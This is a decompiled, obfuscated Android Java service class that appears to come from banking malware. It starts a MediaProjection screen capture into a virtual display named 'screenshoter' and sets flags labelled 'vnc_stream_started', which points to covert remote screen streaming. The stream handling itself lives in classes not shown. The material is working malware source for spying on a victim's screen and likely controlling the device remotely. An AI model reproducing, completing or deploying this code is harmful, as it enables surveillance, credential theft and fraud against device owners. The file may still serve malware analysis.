package com.sonnokta;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.hardware.display.VirtualDisplay;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.view.WindowManager;

import com.sonnokta.utils.LogUtil;

import fddo.Ccatch;
import fddo.Cthrow;

public class p067x extends Service {

    private  static String TAG = "bwolf-p067x";

    /* renamed from: break  reason: not valid java name */
    public static int f25break;

    /* renamed from: catch  reason: not valid java name */
    public static Intent f26catch;

    /* renamed from: this  reason: not valid java name */
    public static boolean f27this;

    /* renamed from: case  reason: not valid java name */
    public MediaProjection f28case;

    /* renamed from: else  reason: not valid java name */
    private Ccatch f29else;

    /* renamed from: fddo  reason: collision with root package name */
    private WindowManager f105fddo;

    /* renamed from: for  reason: not valid java name */
    private Handler f30for;
    /* access modifiers changed from: private */

    /* renamed from: goto  reason: not valid java name */
    public VirtualDisplay f31goto;
    public HandlerThread ifdf = new HandlerThread(getClass().getSimpleName(), 10);

    /* renamed from: new  reason: not valid java name */
    MediaProjection.Callback f32new = new fddo();

    /* renamed from: try  reason: not valid java name */
    private MediaProjectionManager f33try = null;

    class fddo extends MediaProjection.Callback {
        fddo() {
        }

        public void onStop() {
            p067x.this.f31goto.release();
        }
    }

    class ifdf extends Thread {
        ifdf() {
        }

        public void run() {
            try {
                p067x.this.ifdf();
            } catch (Exception unused) {
            }
        }
    }

    public p067x() {
        this.ifdf.start();
        this.f30for = new Handler(this.ifdf.getLooper());
    }

    /* renamed from: for  reason: not valid java name */
    public Handler m45for() {
        LogUtil.showErrorLog(TAG, "--- m45for ---");
        return this.f30for;
    }

    public void ifdf() {
        Cthrow.m154case(getApplicationContext(), "vnc_stream_started", Boolean.TRUE);
        Cthrow.m157goto(getApplicationContext(), "last_vnc_stream_attempt", 0L);

        this.f33try = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        MediaProjection mediaProjection = this.f28case;
        if (mediaProjection != null) {
            mediaProjection.stop();
        }
        this.f28case = this.f33try.getMediaProjection(f25break, f26catch);
        Ccatch catchR = new Ccatch(this);
        this.f29else = catchR;
        MediaProjection mediaProjection2 = this.f28case;
        if (mediaProjection2 != null) {
            this.f31goto = mediaProjection2.createVirtualDisplay("screenshoter", catchR.m53for(), this.f29else.fddo(), getResources().getDisplayMetrics().densityDpi, 9, this.f29else.ifdf(), (VirtualDisplay.Callback) null, this.f30for);
            this.f28case.registerCallback(this.f32new, this.f30for);
        }
    }

    /* renamed from: new  reason: not valid java name */
    public WindowManager m46new() {
        LogUtil.showErrorLog(TAG, "--- m46new ---");
        return this.f105fddo;
    }

    public IBinder onBind(Intent intent) {
        LogUtil.showErrorLog(TAG, "--- onBind ---");
        return null;
    }

    public void onDestroy() {
        f27this = false;
        super.onDestroy();
        LogUtil.showErrorLog(TAG, "--- onDestroy ---");
    }

    public int onStartCommand(Intent intent, int i, int i2) {
        if (intent == null) {
            return Service.START_NOT_STICKY;
        }
        if (intent.hasExtra("stop") && intent.getExtras().getString("stop") != null) {
            MediaProjection mediaProjection = this.f28case;
            if (mediaProjection != null) {
                mediaProjection.stop();
            }
            this.ifdf.quitSafely();
            stopSelf();
            return Service.START_NOT_STICKY;
        } else if (f27this) {
            return Service.START_NOT_STICKY;
        } else {
            f27this = true;
            Context applicationContext = getApplicationContext();
            this.f105fddo = (WindowManager) applicationContext.getSystemService(Context.WINDOW_SERVICE);
            if (f26catch == null) {
                f25break = intent.getIntExtra("code", 0);
                f26catch = (Intent) intent.getParcelableExtra("intent");
            }
            p041i.fddo(applicationContext, this);
            p041i.m24for(applicationContext);
            new ifdf().start();
            return Service.START_NOT_STICKY;
        }
    }

    public void onTaskRemoved(Intent intent) {
        f27this = false;
        super.onTaskRemoved(intent);
        LogUtil.showErrorLog(TAG, "--- onTaskRemoved ---");
    }
}
